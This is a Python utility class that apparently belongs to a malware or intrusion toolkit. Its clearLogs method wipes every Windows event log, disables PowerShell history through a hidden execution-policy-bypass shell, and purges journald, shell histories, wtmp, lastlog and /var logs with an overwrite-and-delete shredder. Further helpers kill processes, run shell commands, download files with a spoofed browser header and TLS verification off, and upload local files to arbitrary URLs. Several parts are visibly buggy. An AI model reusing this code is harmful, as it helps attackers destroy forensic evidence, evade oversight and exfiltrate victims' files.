import os, psutil, time, requests
from random import choice, uniform, randint

class Utils():
    def __init__(self):
        pass

    def randstr(self, length):
        if length == 0:
            length = randint(1,200)
        
        return ''.join([choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789') for _ in range(length)])
    
    def kill(self, procname):
        try:
            if type(procname) is int:
                os.kill(procname, 9)
                return

            for program in psutil.process_iter:
                try:
                    if procname.lower() == program.name.lower():
                        program.kill()
                    
                    return
                except Exception: pass
            
            try:
                if os.name == 'nt': self.run(f'taskkill /t /f /im "{procname}" && wmic Path win32_process Where "Caption Like "{procname}"" Call Terminate')
                else: self.run(f'sudo killall {procname} || pkill -9 {procname}')
            except Exception: pass
        except Exception:
            pass

    def clearLogs(self):
        if os.name == 'nt':
            self.run('cmd.exe /c for /F "tokens=*" %1 in (\'wevtutil.exe el\') DO wevtutil.exe cl "%1"')
            self.run('powershell.exe -InputFormat None -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "Set-PSReadlineOption -HistorySaveStyle SaveNothing"')
        else:
            self.run('sudo journalctl --vacuum-time=1s')
            self.run('sudo journalctl --vacuum-size=1K')
            self.run('sudo journalctl --vacuum-files=1')
            [Utils().shred(file) for file in ['$HISTFILE','$MYSQL_HISTFILE','~/.bash_history','~/.zsh_history','/var/log/wtmp','/var/tmp/*','/var/run/*','/var/*','/var/log/*','/tmp/logs','/root/.bash_logout','/usr/local/apache/logs','/usr/local/apache/log','/var/apache/logs','/var/apache/log','/var/log/lastlog']]
            self.run('export HISTFILE=/dev/null')
            self.run('export MYSQL_HISTFILE=/dev/null')
            self.run('history -c; history -w')

    def proc_exists(self, pname): # checks if a process exists
        for program in psutil.process_iter:
            try:
                if pname.lower() in program.name.lower():
                    return True
            except Exception: pass

        return False

    def shred(self, file, iter=2): # secure file erasing
        if not os.path.exists(file): return

        def _shred(file):
            for _ in range(iter):
                try:
                    with open(file, 'w+', buffering=(2048*2048)) as fd:
                        fd.write(os.urandom(choice(256,512,1024,2048)))
                except Exception:
                    pass
                time.sleep(uniform(0,1))
            os.remove(file)

        if os.path.isdir(file):
            for root, _, files in os.walk(file):
                for file in files:
                    path = os.path.join(root, file)
                    _shred(path)
        else:
            _shred(file)

    def run(self, command): # Runs a command
        try: 
            with os.popen(command) as fd:
                output = fd.read()
            
            return output
        except: pass

    def download(self, url=None, destination=None): # downloads a file
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Dnt': '1',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-Gpc': '1',
                'Te': 'trailers'
            }

            data = requests.get(url, headers=headers, verify=False, timeout=(10,15))
            if os.path.isfile(destination):
                os.remove(destination)

            time.sleep(uniform(0,2))
            with open(destination, 'wb', buffering=(16*1024*1024)) as fd:
                fd.write(data.content)
            return True
        except Exception: return False
    
    def upload(self, source, url): # uploads a file, http://flask.pocoo.org/docs/1.0/patterns/fileuploads/
        try:
            if os.path.exists(source):
                with open(source, 'rb') as f:
                    requests.post(url, data=f)
                return True
            return False
        except Exception:
            return False